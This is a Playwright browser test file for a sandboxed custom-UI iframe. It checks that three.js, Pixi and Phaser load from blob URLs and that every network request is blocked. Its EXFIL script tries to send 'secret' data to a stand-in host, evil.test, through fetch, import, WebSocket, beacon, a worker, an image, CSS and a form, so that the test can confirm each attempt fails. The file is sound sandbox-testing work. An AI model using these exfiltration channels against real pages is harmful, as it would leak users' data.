# ruff: noqa: E501 -- embedded JavaScript bundles are served verbatim
"""A real Chromium runs a UI with a real engine, assets and libraries, and leaks nothing.

The other custom-UI tests prove the policy STRINGS and the controller's logic;
only a browser proves the policy is enforced and the blob: wiring works: an
import map resolving `three`, a module asset importing a sibling as `@ui/...`,
`ta-asset:` in markup, a loader `fetch`ing its blob, globals for Pixi, Phaser
and Howler -- while every attempt to reach a network is blocked.

The parent here is a stand-in for the app (the app's own fetch-verify-post is
tested in Node, test_custom_ui_asset_delivery.py); the frame document, its
headers and the libraries are the shipped ones, served at a fake origin.
"""

from __future__ import annotations

import json
import struct
import zlib
from urllib.parse import unquote, urlsplit

import pytest

from tinyassets.onboarding import ui_library_set
from tinyassets.onboarding.ui_frame import BOOTSTRAP_HTML, FRAME_HEADERS

pytestmark = pytest.mark.real_browser

ORIGIN = "https://ta.test"


def _png(width: int = 4, height: int = 4) -> bytes:
    def chunk(kind: bytes, data: bytes) -> bytes:
        return (struct.pack(">I", len(data)) + kind + data
                + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF))

    raw = b"".join(b"\x00" + b"\x20\xa0\x40" * width for _ in range(height))
    return (b"\x89PNG\r\n\x1a\n"
            + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b""))


PARENT = """<!doctype html><html><body><script>
window.calls=[]; window.done=null;
const SPEC=__SPEC__;
const frame=document.createElement('iframe');
frame.setAttribute('sandbox','allow-scripts');
frame.src='/app/ui-frame';
document.body.appendChild(frame);
window.addEventListener('message', async e=>{
  if(e.source!==frame.contentWindow) return;
  const m=e.data;
  if(!m||m.ta_ui!==1) return;
  if(m.type==='ready'){
    const libraries=[];
    for(const [name,format] of SPEC.libraries)
      libraries.push({name,format,bytes:await (await fetch('/lib/'+encodeURIComponent(name))).arrayBuffer()});
    const files=[];
    for(const [path,type] of SPEC.files)
      files.push({path,media_type:type,bytes:await (await fetch('/asset/'+path)).arrayBuffer()});
    frame.contentWindow.postMessage({ta_ui:1,type:'bundle',bundle:Object.assign({},SPEC.bundle,{files,libraries})},'*');
  }
  if(m.type==='call'){
    window.calls.push({action:m.action,params:m.params});
    if(m.action==='emit'&&m.params.name==='report') window.done=m.params.data;
    frame.contentWindow.postMessage({ta_ui:1,type:'result',id:m.id,ok:true,result:{}},'*');
  }
});
</script></body></html>"""


def _run_ui(spec: dict, files: dict[str, bytes]) -> tuple[dict, list[str], list[str]]:
    sync_api = pytest.importorskip("playwright.sync_api")
    served = {"/lib/" + name: ui_library_set.library_bytes(name)
              for name, _ in spec["libraries"]}
    served.update({"/asset/" + path: data for path, data in files.items()})
    leaks: list[str] = []
    console: list[str] = []

    def route(r):
        url = urlsplit(r.request.url)
        path = unquote(url.path)
        if f"{url.scheme}://{url.netloc}" != ORIGIN:
            leaks.append(r.request.url)
            return r.abort()
        if path == "/parent":
            return r.fulfill(status=200, content_type="text/html",
                             body=PARENT.replace("__SPEC__", json.dumps(spec)))
        if path == "/app/ui-frame":
            return r.fulfill(status=200, content_type="text/html", body=BOOTSTRAP_HTML,
                             headers=dict(FRAME_HEADERS))
        if path in served:
            return r.fulfill(status=200, content_type="application/octet-stream",
                             body=served[path])
        leaks.append(r.request.url)
        return r.fulfill(status=204, body="")

    with sync_api.sync_playwright() as p:
        try:
            browser = p.chromium.launch(args=["--use-gl=swiftshader", "--enable-unsafe-swiftshader"])
        except Exception as exc:  # noqa: BLE001 - no browser on this host
            pytest.skip(f"Chromium is not installed for Playwright: {exc}")
        try:
            page = browser.new_page()
            page.on("console", lambda m: console.append(f"{m.type}: {m.text}"))
            page.route("**/*", route)
            page.goto(ORIGIN + "/parent")
            page.wait_for_function("window.done!==null", timeout=30_000)
            report = page.evaluate("window.done")
        finally:
            browser.close()
    return report, leaks, console


EXFIL = r"""
async function exfil(){
  const out={};
  const tryIt=async(name,fn)=>{ try{ await fn(); out[name]='reached'; }catch(e){ out[name]='blocked'; } };
  await tryIt('fetch_remote',()=>fetch('https://evil.test/f?d=secret'));
  await tryIt('fetch_same_origin',()=>fetch('/app/api/read',{method:'POST',body:'{}'}));
  await tryIt('import_remote',()=>import('https://evil.test/m.js'));
  await tryIt('websocket',()=>new Promise((ok,no)=>{const w=new WebSocket('wss://evil.test/s');w.onopen=ok;w.onerror=no;}));
  out.beacon=(navigator.sendBeacon&&(()=>{try{return navigator.sendBeacon('https://evil.test/b','x')?'queued':'refused'}catch(e){return 'blocked'}})())||'absent';
  // A worker is allowed (blob: only); what matters is that it has no network
  // and no WebRTC either.
  out.worker=await new Promise(ok=>{
    const src="let r={rtc:typeof RTCPeerConnection};"+
      "fetch('https://evil.test/w').then(()=>r.fetch='reached',()=>r.fetch='blocked').finally(()=>postMessage(r));";
    const w=new Worker(URL.createObjectURL(new Blob([src],{type:'text/javascript'})));
    w.onmessage=e=>ok(e.data); w.onerror=()=>ok({error:true}); setTimeout(()=>ok({timeout:true}),3000);});
  out.rtc=typeof RTCPeerConnection;
  const img=new Image(); img.src='https://evil.test/i.png?d=secret';
  const css=document.createElement('div'); css.style.backgroundImage='url(https://evil.test/c.png)'; document.body.appendChild(css);
  const form=document.createElement('form'); form.action='https://evil.test/post'; form.method='post';
  document.body.appendChild(form); try{ form.submit(); }catch(e){}
  await new Promise(r=>setTimeout(r,800));
  return out;
}
"""


def test_a_three_js_module_ui_renders_from_blobs_and_reaches_no_network():
    tile = _png()
    spec = {
        "libraries": [["three", "module"], ["three/addons/controls/OrbitControls.js", "module"]],
        "files": [["img/tile.png", "image/png"], ["game/world.js", "text/javascript"],
                  ["game/util.js", "text/javascript"], ["data/level.json", "application/json"]],
        "bundle": {
            "markup": '<img id=tile src="ta-asset:img/tile.png"><canvas id=c width=64 height=64></canvas>',
            "style": "#tile{background:url(ta-asset:img/tile.png)}",
            "script_type": "module",
            "script": EXFIL + r"""
import * as THREE from "three";
import { OrbitControls } from "three/addons/controls/OrbitControls.js";
import { world } from "./game/world.js";
const canvas=document.getElementById('c');
let rendered='no';
try{
  const renderer=new THREE.WebGLRenderer({canvas});
  const scene=new THREE.Scene(), camera=new THREE.PerspectiveCamera(50,1,0.1,10);
  camera.position.z=3; new OrbitControls(camera,canvas);
  const texture=await new THREE.TextureLoader().loadAsync(tinyassets.asset('img/tile.png'));
  scene.add(new THREE.Mesh(new THREE.BoxGeometry(),new THREE.MeshBasicMaterial({map:texture})));
  renderer.render(scene,camera); rendered='yes';
}catch(e){ rendered='error: '+e.message; }
const tile=document.getElementById('tile');
await (tile.complete?Promise.resolve():new Promise(r=>{tile.onload=r;tile.onerror=r;}));
const level=await (await fetch(tinyassets.asset('data/level.json'))).json();
const blocked=await exfil();
await tinyassets.emit('report',{revision:THREE.REVISION,world,rendered,tileWidth:tile.naturalWidth,
  tileSrcIsBlob:tile.src.startsWith('blob:'),level,blocked});
""",
        },
    }
    files = {"img/tile.png": tile,
             "game/world.js": b'import { twice } from "@ui/game/util.js"; export const world = twice(21);',
             "game/util.js": b"export const twice = n => n * 2;",
             "data/level.json": b'{"rooms": 3}'}

    report, leaks, console = _run_ui(spec, files)

    assert report["revision"] == "170"
    assert report["world"] == 42, "a module asset imports its sibling as @ui/<path>"
    assert report["rendered"] == "yes", report["rendered"]
    assert report["tileWidth"] == 4 and report["tileSrcIsBlob"], "ta-asset: in markup is a blob"
    assert report["level"] == {"rooms": 3}, "a loader can fetch its own blob"
    blocked = report["blocked"]
    for channel in ("fetch_remote", "fetch_same_origin", "import_remote", "websocket"):
        assert blocked[channel] == "blocked", (channel, blocked)
    assert blocked["rtc"] == "undefined"
    assert blocked["worker"] == {"rtc": "undefined", "fetch": "blocked"}, blocked["worker"]
    assert leaks == [], f"requests left the frame: {leaks}"
    assert console, "the CSP violations are reported in the console"


def test_global_libraries_load_in_order_and_pixi_draws_an_asset():
    spec = {
        "libraries": [["pixi.js", "global"], ["phaser", "global"], ["howler", "global"]],
        "files": [["img/tile.png", "image/png"]],
        "bundle": {
            "markup": "", "style": "",
            "script": r"""
(async()=>{
  let pixi='no';
  try{
    const app=new PIXI.Application();
    await app.init({width:32,height:32,preference:'webgl'});
    const texture=await PIXI.Assets.load({src:tinyassets.asset('img/tile.png'),loadParser:'loadTextures'});
    app.stage.addChild(new PIXI.Sprite(texture)); app.render();
    pixi='drew '+texture.width+'x'+texture.height;
  }catch(e){ pixi='error: '+(e&&e.message); }
  await tinyassets.emit('report',{pixi,phaser:Phaser.VERSION,howl:typeof Howl});
})();
""",
        },
    }
    report, leaks, _ = _run_ui(spec, {"img/tile.png": _png()})
    assert report["phaser"] == "3.90.0", report
    assert report["howl"] == "function"
    assert report["pixi"] == "drew 4x4", report["pixi"]
    assert leaks == [], leaks
